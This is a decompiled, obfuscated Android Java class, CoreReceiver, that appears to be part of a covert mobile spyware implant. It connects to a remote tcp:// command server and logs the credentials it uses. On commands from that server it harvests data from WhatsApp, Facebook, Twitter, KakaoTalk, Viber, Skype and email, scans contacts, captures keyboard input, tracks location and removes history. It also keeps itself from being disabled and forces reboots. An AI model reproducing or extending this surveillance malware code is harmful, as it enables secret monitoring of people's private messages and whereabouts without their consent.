package com.network.media;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import com.network.android.SmsReceiver;
import com.network.android.agent.NetworkApp;
import com.network.android.d.c;
import com.network.android.d.e;
import com.network.android.d.g;
import com.network.android.m;
import com.network.android.monitor.observer.i;
import com.network.android.r;
import com.network.android.roomTap.k;
import com.network.b.b;
import com.network.f.a;
import com.network.h.j;
import java.io.File;
import java.util.Date;

public class CoreReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static a f161a;
    public static boolean b = false;
    public static String c = "DOWNLOAD_UPGRADE";
    public static String d = "DOWNLOAD_UPGRADE_STOP";
    public static int e = 0;
    private static Handler f;

    static {
        HandlerThread handlerThread = new HandlerThread("CoreReceiver");
        handlerThread.start();
        f = new Handler(handlerThread.getLooper());
    }

    public static void a(Context context) {
        try {
            com.network.android.c.a.a.a("addServerPushListener start: " + new Date().toGMTString());
            if (SmsReceiver.b == null) {
                com.network.android.c.a.a.a("addServerPushListener token id is null! returning");
                return;
            }
            String str = b.C() + SmsReceiver.b;
            String str2 = b.C() + SmsReceiver.b;
            b.D();
            String str3 = "tcp://" + b.H() + ":" + b.G();
            String B = b.B();
            String A = b.A();
            if (A == null || B == null || str3 == null || str2 == null || str == null) {
                com.network.android.c.a.a.a("addServerPushListener invalid params");
                com.network.android.c.a.b.a(1, 101, "MOSQ_ERR_INVAL");
                return;
            }
            com.network.android.c.a.a.a("addServerPushListener creating new connection. user: " + B + " password: " + A + " url: " + str3);
            f161a = new a(str3, str2, str, B, A, context);
            com.network.android.c.a.b.a(1, 112, "MOSQ_SERVICE_ON");
        } catch (Throwable th) {
            com.network.android.c.a.b.a(1, 103, "MOSQ_ERR_CONN_REFUSED");
            com.network.android.c.a.a.a("addServerPushListener exception- " + th.getMessage(), th);
        }
    }

    public static void a(Context context, Intent intent, String str) {
        try {
            if ("wake up".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver WAKE_UP: " + new Date().toLocaleString());
                try {
                    context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, CoreReceiver.class), 1, 1);
                } catch (Throwable th) {
                    com.network.android.c.a.a.a("dontKill - " + th.getMessage(), th);
                }
                NetworkApp.a(context);
                i.a(context);
            } else if ("whatsUp".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver WHATS_APP");
                context.getContentResolver();
                m.a(SmsReceiver.c, context, false);
            } else if ("twitter".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver TWITTER");
                context.getContentResolver();
                g.a(SmsReceiver.c, context, false);
            } else if ("facebook".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver FACEBOOK");
                context.getContentResolver();
                com.network.android.d.a.a(SmsReceiver.c, context, false);
            } else if ("kakao".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver KAKAO");
                context.getContentResolver();
                c.a(SmsReceiver.c, context, false);
            } else if ("viber".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver VIBER");
                context.getContentResolver();
                com.network.android.d.i.a(f, context, false);
            } else if ("skype".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver SKYPE");
                context.getContentResolver();
                e.a(f, context, false);
            } else if ("GMail".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver General Mail");
                r.a(context, SmsReceiver.c, false, 1);
            } else if ("mail".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver Email type");
                r.a(context, SmsReceiver.c, false, 0);
            } else if ("Contact Scan".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver CONTACT_SCAN luchSchedualQueue: " + new Date().toGMTString());
                i.b(context);
            } else if ("finishLocationMonitor".equals(str)) {
                com.network.android.a.c.c(context);
            } else if ("RemoveHistory".equals(str)) {
                com.network.h.b.a(intent.getStringExtra("toRemove"), context, intent.getIntExtra("timeToStop", 600000), false);
            } else if (c.equals(str)) {
                j.c();
            } else if (d.equals(str)) {
                j.a(false, context, true, true);
            } else if ("keyboard".equals(str)) {
                com.network.d.a.a(SmsReceiver.c, context);
            } else if ("restart".equals(str)) {
                com.network.android.c.a.a.a("CoreReceiver USSD RESTART check is sScreenOn: " + k.d);
                if (!k.d) {
                    long currentTimeMillis = (System.currentTimeMillis() / 1000) - k.c();
                    com.network.android.c.a.a.a("CoreReceiver USSD RESTART check USSD_IDEL_TO_RESTART_SEC: 600 , minutes: 10");
                    com.network.android.c.a.a.a("CoreReceiver USSD RESTART check diff (seconds): " + currentTimeMillis + " , minutes: " + (currentTimeMillis / 60));
                    if (currentTimeMillis > 600) {
                        com.network.android.c.a.a.a("CoreReceiver USSD RESTART call for restart");
                        if (new File("/system/csk").exists()) {
                            com.network.android.c.a.a.a("changeSettings remove auto update");
                            m.c("reboot");
                            return;
                        }
                        return;
                    }
                    com.network.android.c.a.a.a("CoreReceiver USSD will NOT be RESTARTED now");
                }
            }
        } catch (Throwable th2) {
            com.network.android.c.a.a.a("CoreReceiver - " + th2.getMessage(), th2);
        }
    }

    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            com.network.android.c.a.a.a("CoreReceiver onReceive action:" + action + ", Agent Version: " + b.n + ", Date: " + new Date().toGMTString() + " post");
            f.post(new e(this, context, intent, action));
        } catch (Throwable th) {
            com.network.android.c.a.a.a("onReceive Exception- " + th.getMessage(), th);
        }
    }
}
